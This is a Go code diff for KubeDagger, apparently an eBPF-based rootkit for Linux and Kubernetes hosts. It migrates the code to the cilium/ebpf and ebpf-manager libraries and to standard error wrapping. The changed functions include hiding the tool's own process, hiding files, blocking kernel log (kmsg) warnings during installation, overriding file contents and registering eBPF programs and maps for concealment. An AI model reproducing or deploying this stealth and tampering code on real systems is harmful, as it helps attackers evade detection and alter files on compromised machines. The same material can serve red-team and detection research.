@@ -21,7 +21,6 @@ import (
 	"bytes"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"os"
 	"path"
@@ -31,10 +30,9 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/DataDog/ebpf"
-	"github.com/DataDog/ebpf/manager"
+	manager "github.com/DataDog/ebpf-manager"
+	"github.com/cilium/ebpf"
 	"github.com/moby/sys/mountinfo"
-	"github.com/pkg/errors"
 	"github.com/sirupsen/logrus"
 
 	"github.com/yasindce1998/KubeDagger/pkg/assets"
@@ -162,13 +160,13 @@ func (e *KUBEDagger) FaPutPathAttr(m *ebpf.Map, path string, attr FaPathAttr, ov
 			}
 
 			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
-				return errors.Wrap(err, "unable to put path attr")
+				return fmt.Errorf("unable to put path attr: %w", err)
 			}
 
 			e.faPathAttr[key] = attr
 		} else {
 			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
-				return errors.Wrap(err, "unable to put path attr")
+				return fmt.Errorf("unable to put path attr: %w", err)
 			}
 		}
 	}
@@ -181,7 +179,7 @@ func (e *KUBEDagger) FaBlockKmsg() ([]FaFdKey, error) {
 
 	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
 	if err != nil {
-		return nil, errors.Wrap(err, "unable to find map")
+		return nil, fmt.Errorf("unable to find map: %w", err)
 	}
 
 	// block process already having fd on kmsg
@@ -191,7 +189,7 @@ func (e *KUBEDagger) FaBlockKmsg() ([]FaFdKey, error) {
 		}
 
 		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
-			return nil, errors.Wrap(err, "unable to find map")
+			return nil, fmt.Errorf("unable to find map: %w", err)
 		}
 	}
 
@@ -212,7 +210,7 @@ func (e *KUBEDagger) FaBlockKmsg() ([]FaFdKey, error) {
 func (e *KUBEDagger) FaUnBlockKsmg(faFdKeys []FaFdKey) error {
 	filesMap, _, err := e.bootstrapManager.GetMap("fa_fd_attrs")
 	if err != nil {
-		return errors.Wrap(err, "unable to find map")
+		return fmt.Errorf("unable to find map: %w", err)
 	}
 
 	// unblock
@@ -271,17 +269,17 @@ func (e *KUBEDagger) FaHideFile(fsType string, dir string, file string) {
 func (e *KUBEDagger) HideMyself() error {
 	fi, err := os.Stat(fmt.Sprintf("/proc/%d/exe", os.Getpid()))
 	if err != nil {
-		return errors.Wrap(err, "unable to find proc entry")
+		return fmt.Errorf("unable to find proc entry: %w", err)
 	}
 
 	stat, ok := fi.Sys().(*syscall.Stat_t)
 	if !ok {
-		return errors.New("unable to find proc entry")
+		return fmt.Errorf("unable to find proc entry")
 	}
 
 	infos, err := e.ParseMountInfo(int32(os.Getpid()))
 	if err != nil {
-		return errors.Wrap(err, "unable to find mount entries")
+		return fmt.Errorf("unable to find mount entries: %w", err)
 	}
 
 	for _, info := range infos {
@@ -359,7 +357,7 @@ func (e *KUBEDagger) applyOverride() {
 		file, err := os.Open(e.options.SrcFile)
 		if err == nil {
 			defer file.Close()
-			if f, err := ioutil.ReadAll(file); err == nil {
+			if f, err := io.ReadAll(file); err == nil {
 				e.FaOverrideContent("", e.options.TargetFile, bytes.NewReader(f), e.options.AppendMode, e.options.Comm)
 			}
 		}
@@ -384,30 +382,30 @@ func (e *KUBEDagger) installMain() error {
 
 	mainBuf, err := assets.Asset("/main.o")
 	if err != nil {
-		return errors.Wrap(err, "couldn't find asset")
+		return fmt.Errorf("couldn't find asset: %w", err)
 	}
 
 	// initialize the main manager
 	if err := e.mainManager.InitWithOptions(bytes.NewReader(mainBuf), e.mainManagerOptions); err != nil {
-		return errors.Wrap(err, "couldn't init main manager")
+		return fmt.Errorf("couldn't init main manager: %w", err)
 	}
 
 	// setup maps
 	if err := e.setupMainMaps(); err != nil {
-		return errors.Wrap(err, "couldn't init eBPF maps")
+		return fmt.Errorf("couldn't init eBPF maps: %w", err)
 	}
 
 	// start the main manager
 	if err := e.mainManager.Start(); err != nil {
-		return errors.Wrap(err, "couldn't start main manager")
+		return fmt.Errorf("couldn't start main manager: %w", err)
 	}
 
 	if err := e.setupMainProgramMaps(); err != nil {
-		return errors.Wrap(err, "failed to setup program maps")
+		return fmt.Errorf("failed to setup program maps: %w", err)
 	}
 
 	getProgram := func(section string) *ebpf.Program {
-		p, _, _ := e.mainManager.GetProgram(manager.ProbeIdentificationPair{Section: section})
+		p, _, _ := e.mainManager.GetProgram(manager.ProbeIdentificationPair{EBPFFuncName: section})
 		return p[0]
 	}
 
@@ -437,7 +435,7 @@ func (e *KUBEDagger) installMain() error {
 
 	pathKeysMap, _, err := e.bootstrapManager.GetMap("fa_path_attrs")
 	if err != nil {
-		return errors.Wrap(err, "couldn't get fa_path_attrs map")
+		return fmt.Errorf("couldn't get fa_path_attrs map: %w", err)
 	}
 
 	// kmsg override
@@ -489,7 +487,7 @@ func (e *KUBEDagger) start() error {
 	// fetch ebpf assets
 	bootstrapBuf, err := assets.Asset("/bootstrap.o")
 	if err != nil {
-		return errors.Wrap(err, "couldn't find asset")
+		return fmt.Errorf("couldn't find asset: %w", err)
 	}
 
 	// setup the managers
@@ -497,28 +495,28 @@ func (e *KUBEDagger) start() error {
 
 	// initialize the bootstrap manager
 	if err := e.bootstrapManager.InitWithOptions(bytes.NewReader(bootstrapBuf), e.bootstrapManagerOptions); err != nil {
-		return errors.Wrap(err, "couldn't init bootstrap manager")
+		return fmt.Errorf("couldn't init bootstrap manager: %w", err)
 	}
 
 	// start the bootstrap manager
 	if err := e.bootstrapManager.Start(); err != nil {
-		return errors.Wrap(err, "couldn't start bootstrap manager")
+		return fmt.Errorf("couldn't start bootstrap manager: %w", err)
 	}
 
 	// before overriding block kmsg warnings
 	faFdKeys, err := e.FaBlockKmsg()
 	if err != nil {
-		return errors.Wrap(err, "couldn't start bootstrap manager")
+		return fmt.Errorf("couldn't start bootstrap manager: %w", err)
 	}
 
 	// now we can install the main programs
 	if err := e.installMain(); err != nil {
-		return errors.Wrap(err, "couldn't start main manager")
+		return fmt.Errorf("couldn't start main manager: %w", err)
 	}
 
 	// unblock kmsg
 	if err := e.FaUnBlockKsmg(faFdKeys); err != nil {
-		return errors.Wrap(err, "couldn't unblock kmsg")
+		return fmt.Errorf("couldn't unblock kmsg: %w", err)
 	}
 
 	// apply user override
@@ -534,10 +532,10 @@ func (e *KUBEDagger) start() error {
 // Stop shuts down KUBEDagger
 func (e *KUBEDagger) Stop() error {
 	if err := e.bootstrapManager.Stop(manager.CleanAll); err != nil {
-		return errors.Wrap(err, "couldn't stop manager")
+		return fmt.Errorf("couldn't stop manager: %w", err)
 	}
 	if err := e.mainManager.Stop(manager.CleanAll); err != nil {
-		return errors.Wrap(err, "couldn't stop manager")
+		return fmt.Errorf("couldn't stop manager: %w", err)
 	}
 
 	return nil
@@ -558,30 +556,31 @@ func (e *KUBEDagger) setupMainProgramMaps() error {
 
 	bpfProgMap, _, err := e.mainManager.GetMap("bpf_programs")
 	if err != nil {
-		return errors.Wrap(err, "couldn't get bpf program map")
+		return fmt.Errorf("couldn't get bpf program map: %w", err)
 	}
 
 	bpfMapMap, _, err := e.mainManager.GetMap("bpf_maps")
 	if err != nil {
-		return errors.Wrap(err, "couldn't get bpf map map")
+		return fmt.Errorf("couldn't get bpf map map: %w", err)
 	}
 
 	bpfNextProgramMap, _, err := e.mainManager.GetMap("bpf_next_id")
 	if err != nil {
-		return errors.Wrap(err, "couldn't get bpf_next_id map")
+		return fmt.Errorf("couldn't get bpf_next_id map: %w", err)
 	}
 
 	bpfNextProgramMap.Put(uint32(0), uint32(0xFFFFFFFF)) // next program
 	bpfNextProgramMap.Put(uint32(1), uint32(0xFFFFFFFF)) // next map
 
 	putProgram := func(probe *manager.Probe) error {
-		progID, err := probe.Program().ID()
+		info, err := probe.Program().Info()
 		if err != nil {
-			return errors.Wrap(err, "failed to get program id for probe")
+			return fmt.Errorf("failed to get program info for probe: %w", err)
 		}
+		progID, _ := info.ID()
 
 		if err := bpfProgMap.Put(uint32(progID), uint32(0xFFFFFFFF)); err != nil {
-			return errors.Wrap(err, "failed to insert program into map")
+			return fmt.Errorf("failed to insert program into map: %w", err)
 		}
 
 		return nil
@@ -598,13 +597,14 @@ func (e *KUBEDagger) setupMainProgramMaps() error {
 		programs, _, _ := e.mainManager.GetProgram(tailCallRoute.ProbeIdentificationPair)
 
 		for _, program := range programs {
-			progID, err := program.ID()
+			info, err := program.Info()
 			if err != nil {
-				errors.Wrap(err, "failed to get program id for probe")
+				return fmt.Errorf("failed to get program info for probe: %w", err)
 			}
+			progID, _ := info.ID()
 
 			if err := bpfProgMap.Put(uint32(progID), uint32(0xFFFFFFFF)); err != nil {
-				return errors.Wrap(err, "failed to insert program into map")
+				return fmt.Errorf("failed to insert program into map: %w", err)
 			}
 		}
 
@@ -621,16 +621,17 @@ func (e *KUBEDagger) setupMainProgramMaps() error {
 	putMap := func(m *manager.Map) error {
 		ebpfMap, _, err := e.mainManager.GetMap(m.Name)
 		if err != nil {
-			return errors.Wrap(err, "failed to get map")
+			return fmt.Errorf("failed to get map: %w", err)
 		}
 
-		id, err := ebpfMap.ID()
+		info, err := ebpfMap.Info()
 		if err != nil {
-			return errors.Wrap(err, "failed to get map")
+			return fmt.Errorf("failed to get map info: %w", err)
 		}
+		id, _ := info.ID()
 
 		if err := bpfMapMap.Put(uint32(id), uint32(0xFFFFFFFF)); err != nil {
-			return errors.Wrap(err, "failed to insert map id into map")
+			return fmt.Errorf("failed to insert map id into map: %w", err)
 		}
 
 		return nil
